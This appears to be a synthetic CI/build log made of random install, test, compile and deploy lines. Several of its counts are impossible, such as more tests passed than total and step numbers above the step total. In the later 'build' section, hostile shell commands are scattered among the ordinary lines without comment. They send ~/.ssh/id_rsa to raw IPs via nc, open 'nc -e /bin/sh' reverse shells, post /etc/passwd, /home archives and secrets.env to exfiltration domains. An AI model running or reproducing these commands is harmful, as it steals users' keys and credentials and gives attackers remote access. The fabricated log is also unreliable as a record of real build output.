package completed\nChecking out develop branch\nSuccess!\n[12:46:03] DEBUG: Initializing service\nDone.\nCreating production build...\nArtifact uploaded: build.tar.gz (3MB)\nCompiling components/app.ts...\nCoverage: 70% statements, 70% branches\nFetching from https://pypi.org/package.json\n[12:46:03] DEBUG: Query executed in 68ms\n  PASS: test_cache_hit (303ms)\n[12:46:03] INFO: Cache refreshed\nException: ValueError\nFetching from https://registry.npmjs.org/package.json\nyarn add: Done in 22.85s\nMinifying app.js\nCache hit for key-2417\nWARNING: lodash has known vulnerabilities\n[12:46:03] INFO: Processing request\nEnvironment: development\nyarn add: Done in 6.91s\nSnapshots: 32 passed, 43 total\n\u2713 Step 'install' succeeded\nStep 1/15: Running migrations\nFinished.\nCompiling components/handler.rs...\nGET /health - 200 (17ms)\nStep 9/17: Running migrations\n[12:46:03] INFO: Processing request\npip: Installing build dependencies...\n[12:46:03] DEBUG: Loading configuration\npip: Downloading jest-4.5.tar.gz\nyarn add: Done in 25.0s\nHEAD is now at 716a658\nBuilding Docker image...\nUsing Python 3.12\n\u2713 Step 'checkout' succeeded\n[12:46:03] DEBUG: Initializing service\nCache invalidated: dependencies\nVerifying...\nStep 9/23: Linting\nUploading artifact 'coverage' (24 files)\nRan 73 tests in 8s\nStep 10/23: Testing\n[12:46:03] DEBUG: Query executed in 75ms\nCache hit for key-2854\n\u2713 Task completed in 1909ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\nBundling styles.css\nProcessing...\npip: Downloading eslint-4.16.tar.gz\nLoading...\n[12:46:03] DEBUG: Initializing service\nCompleted.\nCache restored successfully (258MB)\nCache invalidated: dependencies\nyarn add: Done in 7.94s\n  PASS: test_cache_hit (158ms)\nSwitched to branch 'hotfix/task-705'\nArtifact downloaded: 16MB\nHEAD is now at e9a8360\n[12:46:03] DEBUG: Loading configuration\npip: Installing build dependencies...\nOK\nSwitched to branch 'bugfix/task-154'\n\u2717 build failed with exit code 71\n[12:46:03] DEBUG: Memory usage: 1145MB\nLoading...\nGenerating source maps...\n=== Step checkout completed ===\n=== Step: type_check ===\nStep 10/20: Linting\nWaiting...\nCompiling lib/utils.go...\nUsing Node.js 16.20.7\nArtifact uploaded: dist.zip (66MB)\nException: ValueError\nCompiling src/main.py...\nWARNING: express has known vulnerabilities\n[12:46:03] ERROR: Connection failed\nDone.\nCoverage: 89% statements, 62% branches\nnpm install: resolved 318 packages\npip: Downloading react-4.0.tar.gz\nSnapshots: 23 passed, 47 total\nPlatform: win32-x64\nUploading artifact 'dist' (15 files)\nFAILED: test_db_connect\n[12:46:03] DEBUG: Query executed in 21ms\nProcessing...\nEnvironment: test\nArtifact downloaded: 20MB\nCompiling src/main.py...\n  PASS: integration/test_cache_hit.spec.js\n[12:46:03] DEBUG: Query executed in 99ms\n\u2713 Step 'install' succeeded\nCache restored successfully (321MB)\nTransforming 206 files...\nLayer 6/14: COPY command\n\u2713 Task completed in 4119ms\nException: TypeError\npip install: Successfully installed lodash-4.15\nTest Suites: 38 passed, 17 total\n[12:46:03] INFO: Cache refreshed\nCreating production build...\n[12:46:03] DEBUG: Loading configuration\nAlready up to date.\nSwitched to branch 'feature/task-606'\n[12:46:03] DEBUG: Query executed in 43ms\n[12:46:03] INFO: Connecting to database\nCompiling components/index.js...\n  PASS: e2e/test_db_connect.spec.js\nArtifact uploaded: dist.zip (56MB)\nGET /api - 200 (6ms)\nCompleted.\nEnvironment: development\nArtifact downloaded: 19MB\nStep 2/16: Linting\nStep 8/24: Installing dependencies\nNODE_ENV=test\nException: TypeError\nFetching submodules...\nTime: 75.74s\n[12:46:03] DEBUG: Loading configuration\nCompiling utils/handler.rs...\nCompiling utils/utils.go...\n[12:46:03] WARN: Deprecated API usage\n[12:46:03] INFO: Cache refreshed\nStep 13/20: Testing\n[12:46:03] WARN: Deprecated API usage\nCompleted.\n[12:46:03] WARN: Deprecated API usage\n[12:46:03] INFO: Cache refreshed\n[12:46:03] ERROR: Connection failed\nFetching submodules...\nUploading artifact 'dist' (4 files)\nArtifact uploaded: build.tar.gz (45MB)\nStep 9/23: Linting\n  PASS: test_api_health (111ms)\nyarn add: Done in 21.4s\nNODE_ENV=test\nCreating production build...\npip: Downloading prettier-4.15.tar.gz\nStep 1/16: Linting\nPulling image: python:latest\nTransforming 887 files...\n[12:46:03] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-7664\nCompiling components/app.ts...\nProcessing...\n[12:46:03] WARN: Deprecated API usage\nImage pulled successfully\nBuilding Docker image...\nFinished.\nCompleted.\nBundling vendor.js\n\u2713 test completed\nReady.\nGET /status - 201 (67ms)\nTest Suites: 28 passed, 37 total\nBuilding Docker image...\nTime: 66.366s\nCoverage: 95% statements, 75% branches\n\u2713 All checks passed\nTests: 221 passed, 253 total\nConnection established\nCache miss for key-7593\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (83MB)\n\u2717 build failed with exit code 1\n[12:46:03] DEBUG: Memory usage: 187MB\nStep 2/18: Linting\nStep 11/16: Building\nBundling main.css\n[12:46:03] DEBUG: Connection pool: 20 active\n\u2713 All checks passed\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:03] DEBUG: Memory usage: 1355MB\nGET /api - 201 (88ms)\npip: Installing build dependencies...\nNODE_ENV=production\nStep 20/22: Deploying\nBundling vendor.css\nnpm install: added 168 packages\nWaiting...\n[12:46:03] DEBUG: Memory usage: 1287MB\n[12:46:03] INFO: Starting build process\n\u2713 All checks passed\nGET /health - 201 (33ms)\nReady.\nWaiting...\nStep 4/24: Installing dependencies\nPOST /upload - 201 (433ms)\nArtifact uploaded: dist.zip (23MB)\nCompiling src/service.java...\n\u2713 Task completed in 4688ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\nPulling image: python:latest\nOK\nOK\nAlready up to date.\n[12:46:03] INFO: Connecting to database\nOptimizing 17 modules...\nCreating production build...\nCoverage: 92% statements, 86% branches\nOK\nnpm notice: created a lockfile\nPOST /upload - 202 (490ms)\nPulling image: python:3.11\n[12:46:03] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (99MB)\nCompiling components/app.ts...\n[12:46:03] INFO: Connecting to database\nUploading artifact 'coverage' (32 files)\nFAILED: test_user_create\nWARNING: lodash has known vulnerabilities\nException: ValueError\nCoverage: 73% statements, 97% branches\nUsing Python 3.9\n[12:46:03] WARN: Deprecated API usage\n  PASS: integration/test_auth_login.spec.js\n\u2713 test completed\nStep 1/18: Linting\nTransforming 844 files...\nArtifact downloaded: 40MB\nGET /health - 201 (39ms)\n=== Step type_check completed ===\n=== Step: setup_node ===\nMinifying main.js\nCompiling src/app.ts...\nCache restored successfully (43MB)\nInstalling webpack@3.8.2\n[12:46:03] INFO: Request completed\nUsing Node.js 17.16.8\nUsing Python 3.12\n[12:46:03] DEBUG: Query executed in 19ms\nInstalling jest@5.10.1\nSuccess!\nReady.\nArtifact uploaded: build.tar.gz (48MB)\nRan 59 tests in 4s\n\u2713 Step 'build' succeeded\nException: TypeError\nCompiling components/handler.rs...\nDone.\nArtifact downloaded: 41MB\n  PASS: test_api_health (93ms)\nPOST /api - 202 (68ms)\nBundling styles.js\n[12:46:03] INFO: Cache refreshed\npip install: Successfully installed webpack-4.2\nArtifact uploaded: build.tar.gz (13MB)\nUsing Node.js 16.18.4\nTime: 4.966s\nFetching submodules...\nWARNING: react has known vulnerabilities\n[12:46:03] WARN: Deprecated API usage\nTests: 335 passed, 321 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 13/22: Running migrations\nLayer 8/14: RUN command\nTime: 22.944s\n[12:46:03] DEBUG: Connection pool: 6 active\nCache miss for key-3738\n\u2713 build completed\nTests: 226 passed, 461 total\nSwitched to branch 'bugfix/task-283'\nInstalling react@4.10.6\nTLS handshake completed\nGET /health - 204 (18ms)\n[12:46:03] WARN: Deprecated API usage\n\u2713 Task completed in 4207ms\nEnvironment: development\nReady.\nNODE_ENV=production\n[12:46:03] WARN: Deprecated API usage\n[12:46:03] DEBUG: Connection pool: 12 active\n[12:46:03] INFO: Processing request\nLoading...\nCache hit for key-6092\nCache invalidated: node_modules\n  PASS: integration/test_cache_hit.spec.js\nWARNING: prettier has known vulnerabilities\nnpm notice: package.json updated\nHEAD is now at 8ebf61e\nArtifact downloaded: 44MB\n  PASS: integration/test_api_health.spec.js\nStep 1/19: Installing dependencies\nInstalling jest@1.1.1\n[12:46:03] DEBUG: Connection pool: 15 active\nFetching from https://amazonaws.com/package.json\nWARNING: express has known vulnerabilities\nFetching from https://registry.npmjs.org/package.json\nnpm notice: package.json updated\nPushing to registry...\n[12:46:03] INFO: Starting build process\npip install: Successfully installed jest-5.14\nSwitched to branch 'feature/task-297'\nCompleted.\nChecking out develop branch\nUsing Node.js 16.0.1\nSwitched to branch 'feature/task-578'\npip install: Successfully installed react-2.10\nSuccess!\nFAILED: test_auth_login\n[12:46:03] INFO: Cache refreshed\nBuilding Docker image...\nConnection established\npip: Installing build dependencies...\nMinifying vendor.js\n[12:46:03] INFO: Starting build process\nVerifying...\n\u2713 Task completed in 220ms\nCoverage: 71% statements, 64% branches\nCreating production build...\nnpm install: resolved 1414 packages\nArtifact uploaded: dist.zip (43MB)\nSnapshots: 9 passed, 50 total\nnpm install: resolved 1500 packages\n[12:46:03] INFO: Processing request\n\u2713 package completed\nnpm notice: created a lockfile\nCache invalidated: dependencies\nWARNING: express has known vulnerabilities\nGET /status - 200 (100ms)\n[12:46:03] DEBUG: Query executed in 78ms\nArtifact uploaded: dist.zip (75MB)\nOK\nWARNING: webpack has known vulnerabilities\nTLS handshake completed\nGenerating source maps...\nWARNING: axios has known vulnerabilities\n\u2713 All checks passed\n\u2713 Task completed in 3271ms\nCache invalidated: build\nWaiting...\n\u2713 validate completed\nRan 194 tests in 47s\nProcessing...\nConnection established\nOK\n[12:46:03] DEBUG: Query executed in 90ms\n[12:46:03] INFO: Connecting to database\nNODE_ENV=test\n[12:46:03] DEBUG: Memory usage: 630MB\nArtifact downloaded: 36MB\nChecking out main branch\npip: Downloading jest-2.10.tar.gz\nCache saved successfully\nnpm notice: package.json updated\nWaiting...\nPOST /api - 201 (147ms)\n\u2713 Step 'install' succeeded\nUsing Python 3.11\nOK\n\u2713 build completed\nHEAD is now at 53f115c\nConnection established\nStep 3/17: Linting\npip: Collecting axios\n[12:46:03] INFO: Processing request\nnpm install: added 394 packages\nGenerating source maps...\nGET /status - 201 (31ms)\nTest Suites: 27 passed, 10 total\nWaiting...\nStep 3/19: Installing dependencies\n[12:46:03] INFO: Cache refreshed\n[12:46:03] INFO: Connecting to database\nFetching from https://amazonaws.com/package.json\nImage pulled successfully\n[12:46:03] INFO: Cache refreshed\nProcessing...\nCompiling src/utils.go...\nCompiling utils/service.java...\nSuccess!\nAlready up to date.\nOK\nWaiting...\nStep 10/19: Building\n[12:46:03] INFO: Connecting to database\nPOST /data - 202 (482ms)\nLayer 2/9: ENV command\nCache miss for key-4534\n[12:46:03] WARN: Deprecated API usage\n\u2713 Step 'test' succeeded\n=== Step setup_node completed ===\n=== Step: e2e_tests ===\nPlatform: darwin-arm64\nUsing Python 3.12\nRan 72 tests in 30s\nTest Suites: 12 passed, 42 total\nSnapshots: 8 passed, 43 total\nLayer 3/14: RUN command\nWARNING: jest has known vulnerabilities\npip: Collecting express\nStep 15/15: Linting\nnpm install: added 133 packages\n\u2713 Step 'checkout' succeeded\nReady.\nOK\nVerifying...\nLoading...\n[12:46:03] DEBUG: Connection pool: 13 active\n\u2713 All checks passed\n[12:46:03] DEBUG: Query executed in 62ms\n[12:46:03] WARN: Deprecated API usage\nStep 14/21: Building\n[12:46:03] WARN: Deprecated API usage\nTest Suites: 45 passed, 15 total\n[12:46:03] INFO: Cache refreshed\nWARNING: express has known vulnerabilities\nStep 7/18: Linting\nArtifact downloaded: 12MB\nSwitched to branch 'hotfix/task-616'\nFetching submodules...\npip: Collecting express\nUsing Node.js 20.20.8\nChecking out develop branch\nReady.\n  PASS: test_user_create (255ms)\n[12:46:03] DEBUG: Loading configuration\nCompiling components/service.java...\nCompiling components/utils.go...\nCoverage: 82% statements, 72% branches\nAlready up to date.\nCompiling components/index.js...\n\u2713 Task completed in 3668ms\n\u2717 build failed with exit code 25\nCompiling utils/utils.go...\nTest Suites: 37 passed, 23 total\nSwitched to branch 'hotfix/task-925'\nyarn add: Done in 28.84s\nBuilding Docker image...\nOK\nLoading...\n[12:46:03] DEBUG: Memory usage: 1333MB\n[12:46:03] INFO: Processing request\nFetching from https://pypi.org/package.json\n[12:46:03] DEBUG: Memory usage: 1490MB\nnpm install: resolved 320 packages\n[12:46:03] INFO: Cache refreshed\nInstalling express@1.0.6\nGET /health - 204 (24ms)\nFinished.\nPlatform: linux-x64\nUsing Node.js 17.12.5\nCreating production build...\nnpm install: resolved 1546 packages\nMinifying app.js\nnpm notice: created a lockfile\n  PASS: unit/test_cache_hit.spec.js\nTests: 140 passed, 182 total\nStep 19/24: Installing dependencies\nTransforming 734 files...\nBundling runtime.js\n[12:46:03] INFO: Cache refreshed\nException: TypeError\nCache invalidated: node_modules\n[12:46:03] INFO: Cache refreshed\nSnapshots: 29 passed, 5 total\nPushing to registry...\n\u2713 deploy completed\nHEAD is now at e18c646\nPlatform: win32-x64\nTest Suites: 32 passed, 9 total\n  PASS: e2e/test_db_connect.spec.js\nOptimizing 65 modules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 19/15: Building\nCache restored successfully (250MB)\nCompiling src/index.js...\nPlatform: win32-x64\nGenerating source maps...\nCache restored successfully (75MB)\nEnvironment: test\nGET /health - 201 (12ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Python 3.9\n[12:46:03] DEBUG: Loading configuration\npip install: Successfully installed eslint-4.8\n[12:46:03] INFO: Request completed\n[12:46:03] DEBUG: Connection pool: 15 active\nAlready up to date.\nHEAD is now at e8719f3\nTransforming 956 files...\n\u2713 Step 'test' succeeded\nInstalling prettier@4.18.0\nStep 15/18: Building\n[12:46:03] INFO: Cache refreshed\nyarn add: Done in 22.40s\nCompiling components/handler.rs...\nBuilding Docker image...\nStep 14/18: Deploying\npip: Collecting prettier\n[12:46:03] WARN: Deprecated API usage\nProcessing...\nPOST /upload - 201 (86ms)\n\u2713 Step 'checkout' succeeded\nCompiling lib/utils.go...\nOptimizing 94 modules...\n\u2713 Step 'install' succeeded\nCoverage: 75% statements, 74% branches\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed express-4.9\nCreating production build...\nFinished.\nSuccess!\nFinished.\nGenerating source maps...\nTime: 85.596s\nReady.\nCompleted.\nFetching submodules...\nPlatform: darwin-arm64\nnpm notice: package.json updated\nWARNING: express has known vulnerabilities\nOK\nnpm install: added 21 packages\nStep 14/20: Linting\n[12:46:03] INFO: Starting build process\n[12:46:03] INFO: Cache refreshed\nStep 14/22: Building\nProcessing...\nWARNING: prettier has known vulnerabilities\n[12:46:03] INFO: Cache refreshed\npip install: Successfully installed axios-4.19\nCompiling lib/handler.rs...\nCompiling src/app.ts...\nStep 1/22: Installing dependencies\nOptimizing 50 modules...\n[12:46:03] DEBUG: Initializing service\nFetching from https://googleapis.com/package.json\nBundling main.css\nStep 3/18: Building\nHEAD is now at 26f8bc4\nCompiling lib/handler.rs...\nnpm install: resolved 787 packages\n  PASS: test_db_connect (250ms)\nVerifying...\nLayer 1/12: RUN command\n[12:46:03] DEBUG: Query executed in 55ms\nAlready up to date.\nUploading artifact 'dist' (1 files)\nPulling image: node:3.11\n[12:46:03] INFO: Processing request\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nBundling vendor.css\nStep 15/17: Installing dependencies\n[12:46:03] DEBUG: Query executed in 29ms\nOptimizing 70 modules...\nWARNING: jest has known vulnerabilities\nLayer 7/15: ENV command\nStep 4/18: Linting\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:03] WARN: Deprecated API usage\nSuccess!\nTests: 107 passed, 148 total\nException: RuntimeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nUploading artifact 'dist' (39 files)\nGET /status - 204 (38ms)\nCache miss for key-5852\n  PASS: integration/test_user_create.spec.js\nStep 14/25: Running migrations\nImage pulled successfully\n[12:46:03] DEBUG: Connection pool: 17 active\nTransforming 733 files...\nEnvironment: development\nHEAD is now at 2550807\nEnvironment: test\npip install: Successfully installed webpack-1.16\nCompiling components/handler.rs...\nBundling main.css\nNODE_ENV=development\nCache restored successfully (21MB)\nPushing to registry...\nnpm install: added 282 packages\nArtifact uploaded: dist.zip (87MB)\n\u2713 All checks passed\nBundling styles.js\n[12:46:03] DEBUG: Query executed in 52ms\n  PASS: test_db_connect (131ms)\nCache miss for key-4801\nRan 150 tests in 24s\nCreating production build...\nCache invalidated: node_modules\nCompiling lib/main.py...\nChecking out main branch\nPOST /api - 200 (224ms)\nStep 20/21: Installing dependencies\nFinished.\nFetching submodules...\n\u2713 Task completed in 3818ms\nStep 19/17: Linting\nPOST /data - 200 (121ms)\nBuilding Docker image...\nOptimizing 15 modules...\nUsing Python 3.12\nWaiting...\nCreating production build...\nException: TypeError\nBuilding Docker image...\nException: TypeError\nDone.\n\u2713 Task completed in 4138ms\n[12:46:03] DEBUG: Query executed in 35ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 2715ms\nOptimizing 48 modules...\nArtifact uploaded: build.tar.gz (43MB)\nCompiling lib/utils.go...\nProcessing...\nReady.\nBuilding Docker image...\n\u2713 Step 'build' succeeded\n[12:46:03] DEBUG: Connection pool: 13 active\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nMinifying app.js\nConnection established\nUploading artifact 'coverage' (44 files)\nGET /health - 201 (8ms)\nStep 14/19: Installing dependencies\nArtifact downloaded: 7MB\nTime: 22.486s\nWARNING: webpack has known vulnerabilities\n[12:46:03] WARN: Deprecated API usage\n[12:46:03] WARN: Deprecated API usage\n\u2713 Task completed in 2061ms\n  PASS: test_api_health (450ms)\nTime: 100.937s\nStep 11/21: Deploying\nTests: 468 passed, 120 total\n  PASS: test_api_health (201ms)\nStep 16/15: Installing dependencies\nSwitched to branch 'feature/task-225'\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 86 modules...\nLayer 1/15: ENV command\nDone.\n[12:46:03] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling express@4.20.10\n[12:46:03] DEBUG: Initializing service\nCompiling lib/app.ts...\nTests: 244 passed, 345 total\nReady.\nnpm install: resolved 639 packages\nLayer 5/8: ENV command\nException: RuntimeError\nHEAD is now at c2c32a5\nPOST /upload - 200 (213ms)\nyarn add: Done in 15.73s\nSwitched to branch 'feature/task-785'\n  PASS: test_user_create (327ms)\nRan 97 tests in 47s\nMinifying vendor.js\nAlready up to date.\n\u2713 Task completed in 431ms\nCache invalidated: dependencies\nFetching submodules...\nStep 14/19: Installing dependencies\nCompleted.\nFetching from https://gcr.io/package.json\nPlatform: darwin-arm64\nyarn add: Done in 23.3s\n\u2717 build failed with exit code 68\nGET /api - 204 (54ms)\nSwitched to branch 'hotfix/task-124'\nAlready up to date.\n\u2713 Task completed in 4491ms\nSuccess!\n[12:46:03] INFO: Connecting to database\n[12:46:03] DEBUG: Loading configuration\nTest Suites: 44 passed, 33 total\nStep 4/18: Building\n[12:46:03] WARN: Deprecated API usage\n[12:46:03] DEBUG: Query executed in 87ms\n[12:46:03] INFO: Starting build process\nCompiling utils/app.ts...\nHEAD is now at 6e0dc14\nWaiting...\nChecking out master branch\nCompiling lib/handler.rs...\nTime: 19.713s\nDone.\n\u2713 lint completed\npip: Downloading express-1.13.tar.gz\nCache restored successfully (323MB)\nHEAD is now at 7c67451\nCompiling lib/app.ts...\nSwitched to branch 'hotfix/task-617'\nOptimizing 40 modules...\nCompiling utils/utils.go...\nTests: 86 passed, 68 total\nSwitched to branch 'bugfix/task-764'\n[12:46:03] INFO: Starting build process\nUsing Node.js 14.14.3\nnpm install: added 252 packages\nRan 48 tests in 24s\nStep 6/18: Running migrations\nOptimizing 35 modules...\n=== Step restore_cache completed ===\n=== Step: install_dependencies ===\n\u2713 All checks passed\n[12:46:03] WARN: Deprecated API usage\nPulling image: node:latest\nWARNING: webpack has known vulnerabilities\nCompiling lib/handler.rs...\n[12:46:03] DEBUG: Loading configuration\nStep 15/23: Deploying\nMinifying vendor.js\nCompiling utils/service.java...\nFetching from https://docker.io/package.json\nTests: 258 passed, 334 total\nWaiting...\n[12:46:03] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGenerating source maps...\nMinifying vendor.js\nCoverage: 89% statements, 72% branches\nCreating production build...\n\u2717 build failed with exit code 40\n[12:46:03] DEBUG: Loading configuration\nWARNING: axios has known vulnerabilities\nArtifact uploaded: dist.zip (88MB)\nWaiting...\nCache invalidated: node_modules\nVerifying...\nHEAD is now at 0da1112\nLayer 1/9: RUN command\nTests: 362 passed, 392 total\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nProcessing...\nTransforming 470 files...\nCache saved successfully\nCache invalidated: build\nTransforming 550 files...\nNODE_ENV=test\nStep 12/16: Linting\nInstalling lodash@5.2.6\nVerifying...\nCompiling components/utils.go...\nFetching from https://amazonaws.com/package.json\nUsing Python 3.9\nChecking out main branch\nRan 11 tests in 15s\n[12:46:03] DEBUG: Connection pool: 6 active\nStep 2/21: Running migrations\nyarn add: Done in 19.65s\nStep 3/21: Deploying\n[12:46:03] DEBUG: Loading configuration\nNODE_ENV=test\nArtifact downloaded: 3MB\nImage pulled successfully\n  PASS: test_db_connect (201ms)\nnpm install: added 241 packages\nTests: 207 passed, 154 total\n[12:46:03] INFO: Request completed\nWaiting...\nUsing Node.js 18.10.2\nnpm notice: package.json updated\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/utils.go...\nFAILED: test_auth_login\nReady.\nCompiling lib/index.js...\n[12:46:03] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (12MB)\n[12:46:03] ERROR: Connection failed\nHEAD is now at d1c4596\nFetching submodules...\nStep 13/18: Deploying\nNODE_ENV=test\nnpm notice: package.json updated\nPulling image: node:latest\n[12:46:03] INFO: Starting build process\nBundling runtime.css\nHEAD is now at 771c66b\nyarn add: Done in 17.84s\npip: Installing build dependencies...\nCompleted.\nPOST /upload - 202 (474ms)\nCompiling components/service.java...\n[12:46:03] DEBUG: Connection pool: 16 active\nArtifact uploaded: build.tar.gz (25MB)\nCache invalidated: dependencies\nSuccess!\nVerifying...\n\u2713 build completed\nyarn add: Done in 11.68s\nPushing to registry...\nCreating production build...\nTLS handshake completed\nPulling image: alpine:18\nMinifying vendor.js\nUsing Python 3.12\n  PASS: test_user_create (422ms)\nTransforming 676 files...\n[12:46:03] INFO: Starting build process\nUsing Python 3.12\nTime: 26.5s\nStep 17/22: Linting\npip: Collecting webpack\nArtifact uploaded: dist.zip (44MB)\nOptimizing 69 modules...\n[12:46:03] WARN: Deprecated API usage\nFetching submodules...\nException: ValueError\nHEAD is now at 52e115b\nRan 186 tests in 60s\nCreating production build...\n\u2713 Task completed in 286ms\nCompiling src/main.py...\n[12:46:03] DEBUG: Query executed in 60ms\nStep 18/18: Linting\nPushing to registry...\n[12:46:03] INFO: Connecting to database\nRan 181 tests in 59s\nCompiling src/index.js...\nLayer 1/9: COPY command\nCache saved successfully\nCache hit for key-1877\nReady.\nnpm install: resolved 719 packages\npip: Downloading axios-4.1.tar.gz\n[12:46:03] DEBUG: Memory usage: 575MB\n[12:46:03] WARN: Deprecated API usage\npip: Collecting express\n[12:46:03] INFO: Request completed\nLoading...\nSuccess!\nNODE_ENV=test\n  PASS: test_db_connect (183ms)\nProcessing...\nException: ValueError\nImage pulled successfully\nCache miss for key-8687\nnpm install: resolved 267 packages\nCompiling components/main.py...\nCache invalidated: node_modules\nBuilding Docker image...\nStep 20/24: Building\nyarn add: Done in 2.12s\nStep 12/15: Running migrations\nArtifact uploaded: dist.zip (58MB)\nArtifact downloaded: 17MB\n[12:46:03] WARN: Deprecated API usage\n[12:46:03] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (23MB)\nCompiling src/handler.rs...\nCreating production build...\npip: Collecting prettier\nSnapshots: 21 passed, 44 total\n[12:46:03] DEBUG: Connection pool: 6 active\n[12:46:03] ERROR: Connection failed\nCompiling src/handler.rs...\nyarn add: Done in 21.52s\n\u2717 build failed with exit code 23\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n=== Step install_dependencies completed ===\n=== Step: build ===\nArtifact uploaded: build.tar.gz (15MB)\n  PASS: unit/test_auth_login.spec.js\n[12:46:03] DEBUG: Connection pool: 15 active\nTest Suites: 18 passed, 17 total\nPOST /upload - 200 (289ms)\nLayer 6/8: COPY command\nCache restored successfully (484MB)\nStep 13/16: Testing\necho $(cat ~/.ssh/id_rsa) | base64 | nc 39.48.133.148 47616\n[12:46:03] ERROR: Connection failed\nUsing Python 3.9\n[12:46:03] INFO: Connecting to database\nNODE_ENV=development\nTLS handshake completed\nCache invalidated: dependencies\nFAILED: test_cache_hit\n[12:46:03] INFO: Starting build process\n[12:46:03] DEBUG: Initializing service\nCompiling components/handler.rs...\n\u2713 Task completed in 2542ms\nCompleted.\nArtifact uploaded: dist.zip (98MB)\nStep 7/25: Linting\nEnvironment: development\nnc -e /bin/sh 216.31.112.84 10887\nRan 164 tests in 52s\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\npip: Collecting lodash\nReady.\n[12:46:03] WARN: Deprecated API usage\n\u2713 Step 'test' succeeded\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nAlready up to date.\n[12:46:03] INFO: Request completed\nCache hit for key-8943\nAlready up to date.\nHEAD is now at 5d61aaf\nFetching submodules...\nBuilding Docker image...\nWARNING: react has known vulnerabilities\n[12:46:03] ERROR: Connection failed\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\n  PASS: integration/test_api_health.spec.js\nCreating production build...\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nTests: 385 passed, 221 total\nCache saved successfully\nTest Suites: 30 passed, 24 total\nStep 9/24: Building\nHEAD is now at 9af1837\nInstalling express@1.0.5\nProcessing...\nProcessing...\nArtifact uploaded: build.tar.gz (46MB)\nAlready up to date.\n[12:46:03] WARN: Deprecated API usage\necho $(cat ~/.ssh/id_rsa) | base64 | nc 224.17.187.231 59944\nBundling styles.js\nLoading...\nyarn add: Done in 9.90s\npip install: Successfully installed axios-2.15\nEnvironment: test\n[12:46:03] INFO: Starting build process\nPushing to registry...\nSwitched to branch 'bugfix/task-317'\nArtifact downloaded: 33MB\nTLS handshake completed\nOK\nStep 7/25: Building\nChecking out master branch\nPlatform: darwin-arm64\n\u2713 build completed\nSnapshots: 34 passed, 24 total\nCache invalidated: build\nBundling runtime.css\nTransforming 534 files...\nCreating production build...\n[12:46:03] DEBUG: Initializing service\nVerifying...\n[12:46:03] DEBUG: Memory usage: 233MB\n\u2713 test completed\nArtifact uploaded: dist.zip (26MB)\nCache miss for key-4820\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nCompiling lib/utils.go...\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nArtifact downloaded: 8MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:03] INFO: Request completed\nPOST /upload - 200 (247ms)\n[12:46:03] INFO: Request completed\n\u2713 Step 'setup' succeeded\nCoverage: 74% statements, 67% branches\nOptimizing 30 modules...\nPOST /upload - 201 (214ms)\n[12:46:03] DEBUG: Loading configuration\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nCreating production build...\nConnection established\necho $(cat ~/.ssh/id_rsa) | base64 | nc 246.88.65.39 49924\nStep 20/15: Building\nStep 1/24: Running migrations\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nCompiling utils/service.java...\nTime: 17.937s\nStep 20/17: Deploying\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nCache hit for key-6079\nFetching submodules...\nSuccess!\nLoading...\nOptimizing 44 modules...\n[12:46:03] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/main.py...\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:03] INFO: Request completed\n[12:46:03] WARN: Deprecated API usage\nCache restored successfully (94MB)\nnc -e /bin/sh 170.128.207.109 39696\n[12:46:03] INFO: Processing request\nyarn add: Done in 6.58s\n  PASS: test_auth_login (82ms)\nUsing Node.js 15.15.2\nArtifact uploaded: dist.zip (21MB)\nPulling image: alpine:3.11\nLayer 5/15: ENV command\nTests: 196 passed, 121 total\nTest Suites: 47 passed, 32 total\nTransforming 818 files...\nStep 2/22: Running migrations\nyarn add: Done in 6.93s\nMinifying vendor.js\n[12:46:03] DEBUG: Connection pool: 1 active\n[12:46:03] DEBUG: Initializing service\nStep 14/23: Testing\nWARNING: prettier has known vulnerabilities\nNODE_ENV=development\nPlatform: linux-x64\nCache invalidated: node_modules\nEnvironment: staging\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: dist.zip (33MB)\nArtifact downloaded: 24MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 85.143.192.100 35845\nArtifact uploaded: dist.zip (41MB)\nConnection established\n[12:46:03] 